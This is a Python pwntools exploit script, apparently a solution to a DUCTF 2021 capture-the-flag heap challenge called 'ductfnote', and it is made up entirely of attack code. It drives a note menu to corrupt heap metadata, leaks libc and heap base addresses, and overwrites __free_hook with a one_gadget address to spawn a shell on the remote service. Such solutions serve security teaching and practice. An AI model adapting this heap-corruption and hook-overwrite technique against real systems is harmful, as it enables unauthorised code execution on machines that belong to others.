from pwn import *

# p = process('./ductfnote')
libc = ELF('./libc-2.31.so')
p = remote('pwn-2021.duc.tf', 31917)

def create(size):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b': ', str(size))

def show():
    p.sendlineafter(b'>> ', b'2')

def edit(data):
    p.sendlineafter(b'>> ', b'3')
    p.sendline(bytes(data))

def delete():
    p.sendlineafter(b'>> ', b'4')

create(0x7f)
delete()

create(10)

create(0)
delete()

for i in range(6):
    create(10)

create(0x7f)
edit(b'A'*0x80 + p64(0)*9 + p32(0) + p64(0) + p64(0x21) + p64(0xffffffffffffffff) + p64(0)*2 + p64(0x561))
delete()

create(0x70)

show()

p.recvuntil(b'\x00\x00')

libc_leak = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00'))
log.info('libc_leak: ' + hex(libc_leak))

libc.address = libc_leak - 0x1ec020
log.info('libc_base: ' + hex(libc.address))

free_hook = libc.sym['__free_hook']
log.info('__free_hook: ' + hex(free_hook))

one_gadget = libc.address + 0xe6c81
log.info('one_gadget: ' + hex(one_gadget))

create(0x3c0)
show()

p.recvuntil(b'------------>\n')
p.recvuntil(b'\x91' + b'\x00'*15)

heap_leak = u64(p.recv(8))
log.info('heap_leak: ' + hex(heap_leak))

heap_base = heap_leak - 0x10
log.info('heap_base: ' + hex(heap_base))

create(0)
create(0)

for i in range(2):
    create(0x7f)
    edit(b'A'*0x1c + p64(heap_base + 0x8e0)*2 + p64(heap_base + 0x990)*2 + b'A'*0x88 + p64(0x140) + p64(heap_base + 0x8e0)*2 + p64(0)*3 + p64(0x190))
    delete()

create(0x7f)
delete()

create(10)

create(0)
delete()

for i in range(6):
    create(10)

create(0x7f)

edit(b'A'*0xe4 + p64(0) + p64(0x140) + p64(0x4c0))
delete()

create(0x200)
edit(b'A'*28 + p64(0) + p64(0x181) + p64(free_hook - 8))

create(0x180)
create(0x180)

edit(p32(0) + p64(one_gadget))

delete()
